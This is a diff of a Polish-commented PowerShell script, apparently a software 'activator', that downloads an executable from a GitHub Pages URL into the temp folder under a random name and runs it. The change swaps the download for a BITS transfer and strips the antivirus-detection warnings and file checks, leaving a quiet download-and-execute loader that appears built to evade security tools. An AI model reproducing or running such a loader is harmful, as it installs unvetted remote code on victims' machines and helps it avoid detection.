@@ -3,46 +3,26 @@
 $URLs = @(
     'https://github.com/testmina77/testmina77.github.io/raw/refs/heads/main/barkowiec_LEGENDA.exe'
 )
-
-foreach ($URL in $URLs | Sort-Object { Get-Random }) {
-    try { 
-        $cmdContent = Invoke-WebRequest -Uri $URL -UseBasicParsing -OutFile "$env:SystemRoot\Temp\tempFile.exe"; 
-        break 
-    } catch {
-        Write-Host "Failed to download from $URL"
-    }
-}
 $rand = [Guid]::NewGuid().Guid
-$path = "$env:temp\$rand.exe"
-if (-not (Test-Path "$path")) {
-    Check3rdAV
-    Write-Host "Failed to download activator from repositories! Quitting..."
-    return
+$file = "$($env:TEMP)\$($rand).exe"
+foreach ($URL in $URLs | Sort-Object { Get-Random }) {
+    
+    # $cmdContent = Invoke-WebRequest -Uri $URL -UseBasicParsing -OutFile $file; 
+	$bitsJobObj = Start-BitsTransfer $URL -Destination $file
+
+	switch ($bitsJobObj.JobState) {
+		'Transferred' {
+			Complete-BitsTransfer -BitsJob $bitsJobObj
+			break
+		}
+		'Error' {
+			
+		}
+	}
 }
 
-# Funkcja do sprawdzania zainstalowanych antywirusów
-function Check3rdAV {
-    $avList = Get-CimInstance -Namespace root\SecurityCenter2 -Class AntiVirusProduct | Where-Object { $_.displayName -notlike '*windows*' } | Select-Object -ExpandProperty displayName
-    if ($avList) {
-        Write-Host '3rd party Antivirus might be blocking the script - ' -ForegroundColor White -BackgroundColor Blue -NoNewline
-        Write-Host " $($avList -join ', ')" -ForegroundColor DarkRed -BackgroundColor White
-    }
-}
-
-# Funkcja do sprawdzania istnienia pliku
-function CheckFile { 
-    param ([string]$FilePath) 
-    if (-not (Test-Path $FilePath)) { 
-        Check3rdAV
-        Write-Host "Failed to create file in temp folder, aborting!"
-        throw 
-    } 
-}
-
-# Sprawdzanie, czy plik został zapisany poprawnie
-CheckFile "$path"
 
 # Uruchomienie pliku .exe w tym samym oknie PowerShell
-Start-Process -FilePath "$path" -PassThru -Wait
+Start-Process -FilePath "$file" -PassThru -Wait
 
 exit
